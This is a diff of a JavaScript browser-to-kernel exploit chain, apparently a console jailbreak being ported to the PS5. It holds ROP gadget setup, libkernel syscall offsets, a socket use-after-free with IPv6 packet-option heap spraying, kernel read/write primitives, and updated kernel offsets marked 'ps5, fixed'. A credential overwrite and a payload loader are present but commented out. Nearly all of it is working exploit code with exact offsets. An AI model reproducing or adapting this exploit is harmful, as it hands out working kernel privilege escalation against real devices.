@@ -686,14 +686,14 @@ function stage2() {
 
   
 
-  alert("before malloc");
+  //alert("before malloc");
 
   fakeVtable_setjmp = p.malloc32(0x200);
   fakeVtable_longjmp = p.malloc32(0x200);
   original_context = p.malloc32(0x40);
   modified_context = p.malloc32(0x40);
 
-  alert("after malloc");
+  //alert("after malloc");
 
   p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
   p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
@@ -716,23 +716,23 @@ function stage2() {
   p.write8(kstr, window.libKernelBase);
   p.write4(kstr.add32(8), 0x40000);
   var countbytes;
-	alert("before syscalls");
+  //alert("before syscalls");
 
-  	window.syscalls[20] = window.libKernelBase.add32(0x31c30);
-	window.syscalls[23] = window.libKernelBase.add32(0x2fd50);
-	window.syscalls[54] = window.libKernelBase.add32(0x30110);
-	window.syscalls[74] = window.libKernelBase.add32(0x30660);
-	window.syscalls[97] = window.libKernelBase.add32(0x32100);
-	window.syscalls[105] = window.libKernelBase.add32(0x2fff0);
-	window.syscalls[118] = window.libKernelBase.add32(0x30250);
-	window.syscalls[324] = window.libKernelBase.add32(0x32350);
-	window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);
-	window.syscalls[533] = window.libKernelBase.add32(0x32310);
-	window.syscalls[534] = window.libKernelBase.add32(0x322f0);
-  alert("after syscalls");
+  window.syscalls[20] = window.libKernelBase.add32(0x31c30);
+  window.syscalls[23] = window.libKernelBase.add32(0x2fd50);
+  window.syscalls[54] = window.libKernelBase.add32(0x30110);
+  window.syscalls[74] = window.libKernelBase.add32(0x30660);
+  window.syscalls[97] = window.libKernelBase.add32(0x32100);
+  window.syscalls[105] = window.libKernelBase.add32(0x2fff0);
+  window.syscalls[118] = window.libKernelBase.add32(0x30250);
+  window.syscalls[324] = window.libKernelBase.add32(0x32350);
+  window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);
+  window.syscalls[533] = window.libKernelBase.add32(0x32310);
+  window.syscalls[534] = window.libKernelBase.add32(0x322f0);
+  //alert("after syscalls");
 
   p.write8(kstr, orig_kview_buf);
-  alert("about to create rop");
+  //alert("about to create rop");
   chain = new rop();
     
   if (chain.syscall(23, 0).low != 0x0) {
@@ -743,7 +743,7 @@ function stage2() {
     }
   } 
     alert("after stage 3");
-	/*
+/*	
     var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
 
@@ -820,7 +820,7 @@ function stage2() {
     });
     loader_thr();
     alert("waiting for payload");
-  */
+*/  
 }
 
 function stage3() {
@@ -838,23 +838,23 @@ function stage3() {
   const TAINT_CLASS = 0x58;
   const TCLASS_MASTER = 0x2AFE0000;
 
-  const PKTOPTS_PKTINFO_OFFSET = 0x10;
-  const PKTOPTS_RTHDR_OFFSET = 0x68;
-  const PKTOPTS_TCLASS_OFFSET = 0xB0;
+  const PKTOPTS_PKTINFO_OFFSET = 0x10;//ps5
+  const PKTOPTS_RTHDR_OFFSET = 0x70;//ps5, fixed
+  const PKTOPTS_TCLASS_OFFSET = 0xC0;//ps5, fixed
 
-  const PROC_UCRED_OFFSET = 0x40;
+  const PROC_UCRED_OFFSET = 0x40;//ps5, same
   const PROC_FILEDESC_OFFSET = 0x48;
-  const PROC_PID_OFFSET = 0xB0;
+  const PROC_PID_OFFSET = 0xBC;//ps5, fixed
 
 
   const FILE_FOPS_OFFSET = 0x8;
   const FILEOPS_IOCTL_OFFSET = 0x18;
-  const VM_MAP_PMAP_OFFSET = 0x120;
+  const VM_MAP_PMAP_OFFSET = 0x130;//ps5, match
 
-  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
-  const KERNEL_MALLOC_OFFSET = 0x301840;
-  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
-  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;
+  const KERNEL_M_IP6OPT_OFFSET = 0x1E77640;//match
+  const KERNEL_MALLOC_OFFSET = 0xAA33C0;//match
+  const KERNEL_ALLPROC_OFFSET = 0x3851B48;//match
+  const KERNEL_PMAP_STORE_OFFSET = 0x4096198;//match
 
   const NUM_SPRAY_SOCKS = 200;
   const NUM_LEAK_SOCKS = 200;
@@ -1198,9 +1198,11 @@ function stage3() {
   }
 
   function brute_force_kernel_map() {
+	  /*
     var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
     for (var i = 0; i < 0xC0; i++) {
       var kernel_pmap_store = kernel_read8(attempt);
+	  //("attempt: 0x" + kernel_pmap_store);
       if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
         kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
         if ((kernel_base.low & 0x3FFF) == 0x0) {
@@ -1211,6 +1213,8 @@ function stage3() {
     }
     alert("[ERROR] failed to find kernel_map REBOOT");
     while (1) {};
+	*/
+	kernel_base = new int64(0x80200000, 0xFFFFFFFF);
   }
 
   function find_proc() {
@@ -1239,16 +1243,22 @@ function stage3() {
   //find uaf
   find_socket_overlap();
   //play with uaf
+  //alert("play");
   fake_pktopts(0);
   leak_sockets[overlapped_socket_idx] = spare_socket;
   //leak shit
+  //alert("leak");
   leak_pktopts();
   fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
-  //find vvictim
+  //alert("find victim");
   find_slave();
   brute_force_kernel_map();
   const proc = find_proc();
   const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
+  
+  //here we go!
+  
+  /*
   kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
 
   find_execution_socket();
@@ -1379,6 +1389,7 @@ function stage3() {
   chain.syscall(54, target_socket, 0x20001111, 0);
   //alert("executed in kernel");
   //p.write8(0, 0);
+  */
 }
 
 const stack_sz = 0x40000;
